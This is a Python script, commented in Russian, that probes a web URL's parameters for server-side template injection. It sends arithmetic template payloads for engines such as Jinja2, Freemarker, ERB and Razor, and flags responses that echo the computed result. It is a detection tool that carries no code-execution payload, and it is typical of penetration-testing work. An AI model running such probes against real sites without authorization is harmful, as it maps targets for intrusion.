#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ssti_probe.py — поиск серверного шаблонизатора (SSTI) по параметру.

  python ssti_probe.py "http://host/?name=x"
  python ssti_probe.py "http://host/?name=x" --param name
  python ssti_probe.py --list

Для каждого payload проверяет, появился ли результат 49/7777777 в ответе.
"""
from __future__ import annotations

# Windows: консоль/pipe не должны падать на Unicode (—, →, «», █).
try:
    import sys as _sys
    for _stream in (_sys.stdout, _sys.stderr):
        _stream.reconfigure(encoding="utf-8", errors="replace")
except Exception:
    pass

import argparse
import sys

import requests

PAYLOADS = [
    ("{{7*7}}", "49", "Jinja2/Twig/Nunjucks"),
    ("${7*7}", "49", "Freemarker/JSP/Thymeleaf"),
    ("#{7*7}", "49", "Ruby/Thymeleaf"),
    ("<%= 7*7 %>", "49", "ERB/EJS"),
    ("{{7*'7'}}", "7777777", "Jinja2"),
    ("${{7*7}}", "49", "Velocity/Spring"),
    ("@(7*7)", "49", "Razor"),
    ("{7*7}", "49", "Smarty? (проверить)"),
]


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("url", nargs="?")
    ap.add_argument("--param", help="какой параметр мутировать")
    ap.add_argument("--method", default="GET", choices=["GET", "POST"])
    ap.add_argument("--timeout", type=float, default=10)
    ap.add_argument("--list", action="store_true")
    args = ap.parse_args()

    if args.list or not args.url:
        for p, marker, engine in PAYLOADS:
            print(f"{p:15s} -> {marker:8s} {engine}")
        return

    import urllib.parse as up
    parsed = up.urlparse(args.url)
    qs = up.parse_qs(parsed.query, keep_blank_values=True)
    params = [args.param] if args.param else list(qs) or ["q"]
    print(f"[+] параметры: {params}")

    def send(p, payload):
        if args.method == "GET":
            q = dict(qs)
            q[p] = [payload]
            url = up.urlunparse(parsed._replace(query=up.urlencode(q, doseq=True)))
            return requests.get(url, timeout=args.timeout)
        return requests.post(args.url, data={p: payload}, timeout=args.timeout)

    try:
        base = send(params[0], "test")
    except requests.RequestException as e:
        print("[-] запрос не удался:", e)
        sys.exit(1)
    base_text = base.text

    hits = 0
    for p in params:
        for payload, marker, engine in PAYLOADS:
            try:
                r = send(p, payload)
            except requests.RequestException as e:
                print(f"[!] {p}={payload}: {e}")
                continue
            if marker in r.text and marker not in base_text:
                hits += 1
                print(f"[!!!] {p}={payload!r} -> {engine} (маркер {marker})")
    if not hits:
        print("[-] явного SSTI не видно. Проверь кодировку, заголовки, POST-поля.")


if __name__ == "__main__":
    main()
